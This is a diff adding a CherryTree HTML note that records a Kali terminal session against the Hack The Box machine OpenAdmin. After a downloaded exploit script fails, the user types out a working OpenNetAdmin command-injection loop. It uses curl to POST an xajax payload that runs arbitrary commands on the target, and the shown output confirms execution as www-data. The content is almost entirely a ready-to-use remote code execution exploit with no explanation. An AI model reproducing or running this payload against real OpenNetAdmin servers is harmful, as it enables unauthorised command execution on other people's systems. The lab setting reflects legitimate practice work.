@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>yee</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>yee</h1><br/>root@kali:~/Desktop/Machines/HTB/OpenAdmin# ./47691.sh <a href="http://10.10.10.171/ona/login.php">http://10.10.10.171/ona/login.php</a><br />./47691.sh: line 8: $&#39;\r&#39;: command not found<br />./47691.sh: line 16: $&#39;\r&#39;: command not found<br />./47691.sh: line 18: $&#39;\r&#39;: command not found<br />./47691.sh: line 23: syntax error near unexpected token `done&#39;<br />./47691.sh: line 23: `done&#39;<br />root@kali:~/Desktop/Machines/HTB/OpenAdmin# URL=&#39;<a href="http://10.10.10.171/ona/login.php'">http://10.10.10.171/ona/login.php&#39;</a><br />root@kali:~/Desktop/Machines/HTB/OpenAdmin# while true;do<br />&gt;  echo -n &quot;$ &quot;; read cmd<br />&gt;  curl --silent -d &quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;${cmd};echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot; &quot;${URL}&quot; | sed -n -e &#39;/BEGIN/,/END/ p&#39; | tail -n +2 | head -n -1<br />&gt; done<br />$ <br />$ whoami<br />www-data<br /></div></body></html>
